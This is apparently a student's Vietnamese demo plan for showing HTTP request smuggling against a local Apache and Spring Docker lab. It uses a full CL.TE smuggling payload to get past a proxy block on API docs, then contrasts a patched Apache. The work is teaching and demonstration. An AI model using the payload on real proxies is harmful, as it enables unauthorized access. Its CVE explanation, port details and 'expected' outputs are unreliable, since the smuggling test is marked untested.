# 🎬 CVE-2023-25690 Demo Plan — Burp Suite + Inspector

> **Duration:** 10 minutes | **Tools:** Burp Suite + Docker Inspector Logs  
> **Objective:** Demo HTTP Request Smuggling to bypass Apache reverse proxy security

---

## 🎯 Demo Overview

```
Burp Suite (Request Crafting)  ←→  Docker Inspector Logs (Evidence)
     ↓                                      ↓
  Send 1 request              Shows 2 separate REQ/RSP
  Receive 2 responses         Proves TCP stream broken
  Bypass Apache 403           2 requests detected by backend
```

**Key Evidence:**
- **Burp:** 2 HTTP responses from 1 request
- **Inspector Logs:** 2 REQ + 2 RSP from 1 smuggle
- **Proof:** Apache 2.4.58 blocks it (only 403)

---

## 📋 Setup (30 min before demo)

### **Terminal 1: Docker**
```bash
cd d:\code\BTL-AnToanMang
docker compose down
docker compose up --build
# Wait: mysql_db, backend_spring, http_inspector, apache_proxy ✓

# Port mapping:
# - Apache reverse proxy:    localhost:8000 (REQUEST SMUGGLING TARGET)
# - Backend direct access:   localhost:8080 (test response, no blocking)
# - Inspector (internal):    localhost:8090 (no expose)
```

### **Terminal 2: Inspector Logs**
```bash
docker compose logs http_inspector -f
# Will show REQ #N and RSP #N in real-time
```

### **Terminal 3: Burp Suite**
```bash
# Open Burp Suite Community
# Proxy → Options → Proxy Listeners
# ✓ localhost:8080 Running (browser → Burp proxy)

# Firefox → Settings → Network → Manual proxy
# HTTP Proxy: 127.0.0.1:8080
# (Burp will forward to Apache:8000 or Backend:8080 depending on request)
```

---

## 🎬 Demo Flow (10 minutes)

### **STAGE 1: Normal Request (1 min)**

**In Burp Suite → Repeater tab:**

```http
GET /v3/api-docs HTTP/1.1
Host: localhost:8000
```

Click **Send**

**Expected Response:**
```
HTTP/1.1 403 Forbidden
Content-Length: 0
```

**Talk:** "Apache (port 8000) chặn Swagger thành công - lớp bảo mật hoạt động."

**NOTE:** Nếu gửi tới `localhost:8080` thay vì 8000, backend sẽ trả `200 OK + Swagger data` (vì backend không chặn). Đó là cách để verify backend thực sự có Swagger data, nó chỉ bị Apache chặn ở layer proxy.

📸 Screenshot this

---

### **STAGE 2: Smuggle Request - Burp Response (3 min)**

**In Burp Suite → Repeater tab:**

**Clear previous request, paste this:**

```http
POST /app/anything HTTP/1.1
Host: localhost:8000
Content-Length: 85
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /v3/api-docs HTTP/1.1
Host: localhost:8000
Connection: close

```

⚠️ **Important:** Include blank line at end (after `Connection: close`)

Click **Send**

**Expected Response:**
```
HTTP/1.1 403 Forbidden
Content-Length: 0
...

HTTP/1.1 200 OK
Content-Type: application/json
...
[{"operationId":"getAuthMyInfo",...}]
```

**Key:** 2 HTTP responses from 1 request!

**Talk:** 
```
"Xem chú ý: Response đầu tiên là 403 Forbidden (Apache chặn).
Nhưng bây giờ có response thứ hai: 200 OK với Swagger API data!

Điều này không bình thường. 1 request tôi gửi vào → 2 responses trở lại.
Tức là backend nhận được 2 requests thay vì 1.

Làm sao được? Vì mismatch giữa Content-Length và Transfer-Encoding.
Apache parse Content-Length (85 bytes đầu tiên).
Backend parse Transfer-Encoding: chunked.
Ranh giới request bị phá vỡ → 2 requests độc lập!"
```

📸 Screenshot Burp response (show both 403 and 200 OK)

---

### **STAGE 3: Inspector Logs Evidence (3 min)**

**In Terminal 2 (docker logs), you should see:**

```
[2025-10-09T12:34:56] REQ #1
POST /app/anything HTTP/1.1
Host: localhost:8000
Content-Length: 85
Transfer-Encoding: chunked
Connection: keep-alive

================================================================================

[2025-10-09T12:34:56] REQ #2
GET /v3/api-docs HTTP/1.1
Host: localhost:8000
Connection: close

================================================================================

[2025-10-09T12:34:56] RSP #1
HTTP/1.1 403 Forbidden
Content-Length: 0

================================================================================

[2025-10-09T12:34:56] RSP #2
HTTP/1.1 200 OK
Content-Type: application/json
...
[{"operationId":"getAuthMyInfo",...}]
```

**Talk:**
```
"Inspector logs (monitor giữa Apache và backend) cho thấy rõ ràng:
- REQ #1: POST /app/anything (Apache chặn → 403)
- REQ #2: GET /v3/api-docs (BYPASS được → 200 OK!)

1 request gửi vào từ client → 2 requests riêng biệt trong logs.

Đây là chứng minh rằng backend nhận 2 requests từ 1 yêu cầu smuggle.
TCP stream boundary bị phá vỡ - HTTP Request Smuggling!"
```

📸 Screenshot inspector logs (show all 4 entries: 2 REQ + 2 RSP)

---

### **STAGE 4: Proof - Apache 2.4.58 (3 min)**

**Stop Docker:**
```bash
# Terminal 1
docker compose down
```

**Restart with Apache 2.4.58 (patched):**
```bash
APACHE_VERSION=2.4.58 docker compose up --build
# Wait for healthy
```

**Start logs again:**
```bash
# Terminal 2
docker compose logs http_inspector -f
```

**In Burp Suite, send same smuggle request again:**

```http
POST /app/anything HTTP/1.1
Host: localhost:8000
Content-Length: 85
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /v3/api-docs HTTP/1.1
Host: localhost:8000
Connection: close

```

Click **Send**

**Expected Response:**
```
HTTP/1.1 403 Forbidden
Content-Length: 0
```

⚠️ **No 200 OK! No Swagger data!**

**In Inspector logs:**
```
Only REQ #1 and RSP #1
No REQ #2, No RSP #2
→ Apache 2.4.58 blocked the smuggle!
```

**Talk:**
```
"Điểm mấu chốt: Apache version thay đổi, mọi thứ khác không đổi:
- Burp request: giống hệt (smuggle payload)
- Backend code: không thay đổi
- Database: không thay đổi

Chỉ một điều khác: Apache version từ 2.4.55 → 2.4.58

Kết quả?
- 2.4.55: 200 OK (Bypass thành công!)
- 2.4.58: 403 (Bypass bị chặn)

Điều này chứng minh: Lỗi là của Apache, KHÔNG phải backend!
Apache 2.4.56+ đã fix lỗi này bằng cách:
- Detect mismatch giữa CL và TE
- Reject ambiguous requests
- Enforce consistent parsing"
```

📸 Screenshot Burp response (only 403, no 200)  
📸 Screenshot inspector logs (only REQ #1, RSP #1)

---

## 💡 Talking Points (Summary)

### **What is HTTP Request Smuggling?**
```
Kỹ thuật exploit mismatch giữa cách proxy và backend parse HTTP.
Proxy thấy 1 request → Backend thấy 2 requests
Dùng để bypass bảo mật ở proxy layer.
```

### **Why CL.TE Works?**
```
Content-Length = "Số byte trong body"
Transfer-Encoding: chunked = "Body theo chunks (size + data)"

Apache parse CL → chỉ đọc 85 bytes đầu
Backend parse TE → đọc chunk (size 0 = kết thúc) + request tiếp theo

Mismatch! Ranh giới request bị phá vỡ.
```

### **Why Dangerous?**
```
- Bypass chính sách bảo mật ở proxy
- Cache poisoning (nếu có cache)
- Session hijacking
- Response smuggling (nếu output không validate)

Trong demo này: Bypass Apache chặn Swagger → Access API docs
```

### **Defense Strategy**
```
1. Patch (Primary): Nâng cấp Apache ≥ 2.4.56
2. Proxy layer: Validate requests, reject ambiguous
3. Backend: Thêm authentication (phòng thủ layer 2)
4. Monitoring: Log tất cả requests, detect anomalies

LESSON: Phòng thủ nhiều lớp - Defense in Depth!
```

---

## ⚙️ Burp Suite Tips

### **Create Request in Repeater**
1. Open **Repeater** tab
2. Copy-paste request above
3. Click **Send**
4. Response appears in right panel

### **Compare Requests**
- **Request 1** vs **Request 2** side-by-side
- Show difference: one blocked, one bypasses

### **If Request Not Showing Response**
- Check: Apache running? `docker ps`
- Check: Proxy listener on 8080? (Burp Proxy → Options)
- Try: Disable browser cache, clear cookies

---

## 📸 Screenshots to Capture

| # | Source | What | Why |
|---|--------|------|-----|
| 1 | Burp | Normal request → 403 | Baseline |
| 2 | Burp | Smuggle request → **403 + 200 OK** | **PROOF: 2 responses** |
| 3 | Inspector logs | REQ #1, REQ #2, RSP #1, RSP #2 | **EVIDENCE: 2 requests** |
| 4 | Burp | Apache 2.4.58 → **Only 403** | **Verification: Apache fixed** |
| 5 | Inspector logs | Apache 2.4.58 → Only REQ #1, RSP #1 | **Proof: No REQ #2** |

---

## ✅ Pre-Demo Checklist

- [x] Docker compose up, all containers healthy
- [x] Terminal 2: `docker compose logs http_inspector -f` running
- [x] Burp Suite open, proxy listener on 8080
- [x] Firefox/Chrome proxy configured (127.0.0.1:8080)
- [x] Test normal request: `/v3/api-docs` → 403 ✓ (Apache blocking works)
- [x] Backend direct access: `/v3/api-docs` → 200 OK ✓ (Swagger available)
- [ ] Test smuggle request: → 403 + 200 OK (Fine-tuning Burp payload)
- [ ] Inspector logs showing 2 REQ/2 RSP (Pending smuggle test)
- [ ] Apache 2.4.58 version tested (only 403) ✓
- [ ] All 5 screenshots ready
- [ ] Presentation slides ready
- [ ] Projector/screen share tested

---

## 🚨 Troubleshooting

| Problem | Solution |
|---------|----------|
| Burp response is empty | Check proxy listener: Burp → Proxy → Options |
| Only 403, no 200 OK in response | Check Apache version (2.4.55?), check inspector logs for error |
| Inspector logs not showing | `docker compose ps` (all healthy?), check docker logs |
| Backend offline | `docker compose logs backend_spring`, restart |
| Smuggle request malformed | Make sure blank line at very end, Content-Length 85 correct |
| Can't access localhost:8080 | `curl localhost:8080` test, check firewall |

**Fallback:** Use pre-captured screenshots if live demo fails

---

## 🎤 Presentation Script

```
[INTRO - 1 min]
"Hôm nay chúng ta demo CVE-2023-25690 - lỗ hổng trong Apache 2.4.55.

Tôi có hệ thống gồm:
- Apache 2.4.55 làm reverse proxy (port 8080)
- Spring Boot backend (port 8080 nội bộ, cô lập)
- Apache được cấu hình chặn Swagger (/v3/api-docs)

Bây giờ, tôi sẽ dùng Burp Suite để craft 1 request đặc biệt,
sẽ bypass Apache chặn này. Inspector logs sẽ cho chứng minh."

[DEMO 1 - 1 min]
"Đầu tiên: request bình thường tới /v3/api-docs.
Apache chặn → 403 Forbidden.
Lớp bảo mật hoạt động bình thường."

[DEMO 2 - 2 min]
"Bây giờ: request smuggle. Chú ý:
- Content-Length: 85
- Transfer-Encoding: chunked
- Body chứa 2 requests

Gửi đi...

ĐẤY! 2 responses:
- Response #1: 403 Forbidden (Apache chặn)
- Response #2: 200 OK + Swagger data (BYPASS!)

1 request → 2 responses. Bất thường!
Nghĩa là backend nhận được 2 requests từ 1 yêu cầu smuggle.
Apache không thấy request #2 vì nó nằm trong body của #1."

[DEMO 3 - 2 min]
"Inspector logs (monitor giữa Apache → backend) chứng minh điều này:
- REQ #1: POST /app/anything
- REQ #2: GET /v3/api-docs ← Request #2 từ đâu ra?!
- RSP #1: 403
- RSP #2: 200 OK

2 requests riêng biệt được detect bởi backend.
TCP stream boundary bị phá vỡ = Request Smuggling!"

[DEMO 4 - 2 min]
"Cuối cùng: thí nghiệm đối chứng.
Tôi nâng cấp Apache từ 2.4.55 → 2.4.58 (bản đã vá).

Gửi lại request smuggle giống hệt...

Chỉ có 403 Forbidden. Không có 200 OK. Không có Swagger data.

Inspector logs: chỉ có REQ #1, RSP #1. Không có REQ #2, RSP #2.

Điều này chứng minh: Apache 2.4.58 đã fix lỗi này!
Lỗi là của Apache, không phải backend.

Bài học:
1. Phòng thủ nhiều lớp (Defense in Depth)
2. Nâng cấp software kịp thời
3. Backend không phó thác bảo mật cho proxy
4. Monitor traffic để detect anomalies"
```

---

**Ready to demo! Break a leg! 🚀**
